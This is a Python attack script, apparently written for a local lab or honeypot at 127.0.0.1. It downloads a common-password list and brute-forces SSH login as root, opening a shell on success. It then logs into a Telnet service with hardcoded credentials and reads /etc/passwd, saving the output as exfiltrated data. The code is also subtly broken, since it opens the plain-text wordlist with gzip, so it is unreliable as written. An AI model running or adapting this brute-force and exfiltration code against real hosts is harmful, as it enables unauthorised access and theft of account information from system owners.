from pwn import *
import paramiko
import requests
import shutil
import gzip
import telnetlib

host = "127.0.0.1"
port = 2222
username = "root"
attempts = 0
timeout = 10

# Download the common passwords file
def download_file(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        with open(local_filename, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
    return local_filename
url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
filename = download_file(url)
print("*** Attempts ***")

#Decompress the file and read line per line
with gzip.open(filename, "rb") as pass_list:
    for password in pass_list:
        password  = password.decode("utf-8").strip("\n")
        try:
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
            client.connect(hostname=host, port=port,
                    username=username, password=password, timeout=timeout,
                    look_for_keys=False, allow_agent=False)
            print("[{}] Valid password found: '{}'".format(attempts, password))
            #stdin, stdout, stderr = client.exec_command("ls")
            #print(stdout.read())
            client.invoke_shell()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("[{}] Invalid password: '{}'".format(attempts, password))
        except paramiko.ssh_exception.SSHException:
            print("[{}] Connection closed".format(attempts))
        except Exception as e:
            print(e)
       # finally:
            #client.close()
        attempts += 1

def connect_telnet():
    print("*** Telnet Connection ***")
    host = "127.0.0.1"
    port = 2223
    username = "user"
    password = "monkey"

    try:
        tn = telnetlib.Telnet(host, port, timeout=10)
        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        
        # Vérifiez si un prompt est retourné après le login
        response = tn.read_until(b"$", timeout=5).decode('ascii')
        if "$" in response or "~$" in response:
            print("Telnet connection successful.")
            return tn
        else:
            print("Login failed.")
            return None
    except Exception as e:
        print(f"Telnet error: {e}")
        return None


def exfiltrate_files_telnet(tn):
    print("*** Exfiltrating /etc/passwd via Telnet ***")
    try:
        # Envoyer la commande pour lire le fichier
        tn.write(b"cat /etc/passwd\n")
        response = tn.read_until(b"$", timeout=5).decode('ascii')
        
        # Sauvegarder le contenu localement
        with open("exfiltrated_passwd_telnet.txt", "w") as f:
            f.write(response)
        
        print("Exfiltration complete. Content saved to exfiltrated_passwd_telnet.txt")
    except Exception as e:
        print(f"Error during file exfiltration via Telnet: {e}")


if __name__ == "__main__":
    # Connect to Telnet
    telnet_client = connect_telnet()
    if telnet_client:
        # Exfiltrate files via Telnet
        exfiltrate_files_telnet(telnet_client)

        # Close the Telnet connection
        telnet_client.close()

